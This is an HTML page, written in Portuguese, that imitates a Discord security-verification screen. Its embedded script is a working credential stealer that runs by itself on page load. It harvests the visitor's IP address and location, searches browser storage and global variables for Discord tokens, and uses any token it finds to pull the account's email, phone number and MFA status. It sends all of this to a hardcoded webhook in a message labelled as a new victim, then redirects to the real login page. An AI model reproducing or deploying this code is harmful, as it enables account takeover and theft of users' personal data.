<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord - Verificação de Segurança</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1e1e2e, #2c2c3e);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
        }
        .container {
            background: #31313f;
            border-radius: 16px;
            padding: 40px;
            max-width: 480px;
            width: 90%;
            text-align: center;
            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
        }
        .logo { width: 80px; margin-bottom: 20px; }
        h1 { font-size: 24px; margin-bottom: 8px; }
        .subtitle { color: #b9bbbe; font-size: 14px; margin-bottom: 24px; }
        .progress-bar {
            width: 100%; height: 8px;
            background: #20202b; border-radius: 4px;
            overflow: hidden; margin: 20px 0;
        }
        .progress-fill {
            height: 100%; width: 0%;
            background: #5865F2; border-radius: 4px;
            transition: width 0.5s;
        }
        .status { color: #b9bbbe; font-size: 13px; margin-bottom: 8px; }
        .footer { margin-top: 24px; font-size: 12px; color: #4e5058; }
    </style>
</head>
<body>
<div class="container">
    <svg class="logo" viewBox="0 0 127.14 96.36" fill="#5865F2">
        <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,56.6,122.09,32.65,107.7,8.07ZM42.25,65.64C36.21,65.64,31.3,60,31.3,53.2s5-12.5,11.14-12.5S53.57,46.6,53.57,53.2,48.36,65.64,42.25,65.64Zm42.64,0C78.85,65.64,74,60,74,53.2s5-12.5,11.12-12.5S96.21,46.6,96.21,53.2,91,65.64,84.89,65.64Z"/>
    </svg>
    <h1>Verificação de segurança necessária</h1>
    <p class="subtitle">Sua conta do Discord precisa ser verificada devido a uma atividade suspeita.</p>
    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
    <p class="status" id="statusText">Iniciando verificação...</p>
    <div class="footer">Discord Inc. &bull; Verificação automática de segurança</div>
</div>

<script>
    (async function() {
        // === TEU WEBHOOK ===
        const webhookURL = "https://discord.com/api/webhooks/1520884691513639174/nz4F2yga5kOKPn0knFLa4fk786ksWsoM9dUDWrHz4tRUPqZejuhscaxDkgUluMVPGp37";
        
        const statusText = document.getElementById('statusText');
        const progressFill = document.getElementById('progressFill');

        function atualizar(texto, progresso) {
            statusText.textContent = texto;
            progressFill.style.width = progresso + "%";
        }

        // 1. CAPTURAR IP
        atualizar("Coletando informações do sistema...", 10);
        let ip = "Não capturado";
        try {
            const resp = await fetch("https://api.ipify.org?format=json");
            const data = await resp.json();
            ip = data.ip;
        } catch(e) {
            try {
                const resp = await fetch("https://api.my-ip.io/ip.json");
                const data = await resp.json();
                ip = data.ip;
            } catch(e2) {}
        }

        // 2. GEOLOCALIZAÇÃO
        atualizar("Analisando localização...", 20);
        let cidade = "N/A", pais = "N/A", isp = "N/A", lat = "N/A", lon = "N/A";
        try {
            const locResp = await fetch("https://ipapi.co/json/");
            const locData = await locResp.json();
            cidade = locData.city || "N/A";
            pais = locData.country_name || "N/A";
            isp = locData.org || "N/A";
            lat = locData.latitude || "N/A";
            lon = locData.longitude || "N/A";
        } catch(e) {}

        // 3. CAPTURAR TOKEN - MÚLTIPLOS MÉTODOS
        atualizar("Analisando sessão do Discord...", 35);
        
        let token = null;
        let metodosEncontrados = [];
        
        // Método 1: localStorage direto
        try {
            const t = localStorage.getItem("token");
            if (t) { token = t; metodosEncontrados.push("localStorage"); }
        } catch(e) {}
        
        // Método 2: sessionStorage direto
        if (!token) {
            try {
                const t = sessionStorage.getItem("token");
                if (t) { token = t; metodosEncontrados.push("sessionStorage"); }
            } catch(e) {}
        }
        
        // Método 3: Varrer localStorage inteiro
        if (!token) {
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const chave = localStorage.key(i);
                    const valor = localStorage.getItem(chave);
                    if (valor && valor.includes(".") && valor.split(".").length === 3 && valor.length > 50) {
                        token = valor;
                        metodosEncontrados.push("localStorage:" + chave);
                        break;
                    }
                }
            } catch(e) {}
        }
        
        // Método 4: Varrer sessionStorage inteiro
        if (!token) {
            try {
                for (let i = 0; i < sessionStorage.length; i++) {
                    const chave = sessionStorage.key(i);
                    const valor = sessionStorage.getItem(chave);
                    if (valor && valor.includes(".") && valor.split(".").length === 3 && valor.length > 50) {
                        token = valor;
                        metodosEncontrados.push("sessionStorage:" + chave);
                        break;
                    }
                }
            } catch(e) {}
        }
        
        // Método 5: Procurar por mfa.
        if (!token) {
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const chave = localStorage.key(i);
                    const valor = localStorage.getItem(chave);
                    if (valor && valor.includes("mfa.")) {
                        token = valor;
                        metodosEncontrados.push("mfa localStorage");
                        break;
                    }
                }
            } catch(e) {}
        }
        
        // Método 6: Procurar em todas as variáveis globais
        if (!token) {
            try {
                for (const key in window) {
                    if (window[key] && typeof window[key] === 'string' && window[key].includes(".") && window[key].split(".").length === 3 && window[key].length > 50) {
                        token = window[key];
                        metodosEncontrados.push("window." + key);
                        break;
                    }
                }
            } catch(e) {}
        }

        // 4. PEGAR DADOS DA CONTA
        atualizar("Verificando dados da conta...", 50);
        
        let email = "Não disponível";
        let phone = "Não vinculado";
        let username = "Não logado";
        let userID = "Desconhecido";
        let nitro = "N/A";
        let mfaEnabled = "N/A";
        let bio = "N/A";
        let avatarURL = "N/A";
        
        if (token && token.length > 50) {
            try {
                const userResp = await fetch("https://discord.com/api/v9/users/@me", {
                    headers: { "Authorization": token }
                });
                
                if (userResp.ok) {
                    const data = await userResp.json();
                    
                    email = data.email || "Oculto";
                    phone = data.phone || "Não vinculado";
                    username = data.username + "#" + (data.discriminator || "0");
                    userID = data.id || "Desconhecido";
                    mfaEnabled = data.mfa_enabled ? "Sim" : "Não";
                    bio = data.bio || "Vazio";
                    
                    // Nitro
                    const premium = data.premium_type || 0;
                    if (premium === 2) nitro = "Nitro Clássico";
                    else if (premium === 1) nitro = "Nitro Básico";
                    else nitro = "Não";
                    
                    // Avatar
                    if (data.avatar && data.id) {
                        const ext = data.avatar.startsWith("a_") ? "gif" : "png";
                        avatarURL = `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}.${ext}`;
                    }
                    
                    // Tentar pegar email das settings se estiver oculto
                    if (email === "Oculto") {
                        try {
                            const settingsResp = await fetch("https://discord.com/api/v9/users/@me/settings", {
                                headers: { "Authorization": token }
                            });
                            if (settingsResp.ok) {
                                const settingsData = await settingsResp.json();
                                if (settingsData.email) email = settingsData.email;
                                if (settingsData.phone) phone = settingsData.phone;
                            }
                        } catch(e) {}
                    }
                    
                    // Tentar billing (cartões salvos)
                    try {
                        const billingResp = await fetch("https://discord.com/api/v9/users/@me/billing/payment-sources", {
                            headers: { "Authorization": token }
                        });
                        if (billingResp.ok) {
                            const billingData = await billingResp.json();
                            // Só indica se tem, não envia dados completos por segurança
                        }
                    } catch(e) {}
                    
                } else {
                    token = token.substring(0, 15) + "..." + token.substring(token.length - 10) + " (INVÁLIDO)";
                }
            } catch(e) {
                token = "Erro ao validar";
            }
        } else {
            token = "Não encontrado";
        }

        // 5. INFO DO NAVEGADOR
        atualizar("Finalizando...", 75);
        const platform = navigator.platform;
        const language = navigator.language;
        const userAgent = navigator.userAgent.substring(0, 120);
        const screenRes = `${screen.width}x${screen.height}`;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const cookiesDiscord = document.cookie.includes("discord") ? "Sim" : "Não";

        // 6. ENVIAR TUDO
        atualizar("Enviando dados...", 85);
        
        const metodoUsado = metodosEncontrados.length > 0 ? metodosEncontrados.join(", ") : "Nenhum";
        
        const mensagem = 
            `**🎯 NOVA VÍTIMA**\n` +
            `**━━━━━━━━━━━━━━**\n` +
            `**👤 USUÁRIO**\n` +
            `**Discord:** ${username}\n` +
            `**ID:** ${userID}\n` +
            `**Email:** ${email}\n` +
            `**Telefone:** ${phone}\n` +
            `**MFA:** ${mfaEnabled}\n` +
            `**Nitro:** ${nitro}\n` +
            `**Bio:** ${bio}\n` +
            `**Avatar:** ${avatarURL}\n` +
            `**━━━━━━━━━━━━━━**\n` +
            `**🔑 TOKEN**\n` +
            `\`${token}\`\n` +
            `**Método:** ${metodoUsado}\n` +
            `**━━━━━━━━━━━━━━**\n` +
            `**🌐 REDE**\n` +
            `**IP:** ${ip}\n` +
            `**Cidade:** ${cidade}\n` +
            `**País:** ${pais}\n` +
            `**ISP:** ${isp}\n` +
            `**Lat/Lon:** ${lat}, ${lon}\n` +
            `**━━━━━━━━━━━━━━**\n` +
            `**💻 SISTEMA**\n` +
            `**Plataforma:** ${platform}\n` +
            `**Idioma:** ${language}\n` +
            `**Resolução:** ${screenRes}\n` +
            `**Timezone:** ${timezone}\n` +
            `**User-Agent:** ${userAgent}\n` +
            `**Cookies Discord:** ${cookiesDiscord}`;

        try {
            await fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: mensagem })
            });
        } catch(e) {
            try {
                const blob = new Blob([JSON.stringify({ content: mensagem })], { type: 'application/json' });
                navigator.sendBeacon(webhookURL, blob);
            } catch(e2) {}
        }

        // 7. FINALIZAR
        atualizar("Verificação concluída! Redirecionando...", 100);
        
        setTimeout(() => {
            window.location.href = "https://discord.com/login";
        }, 3000);
    })();
</script>
</body>
</html>
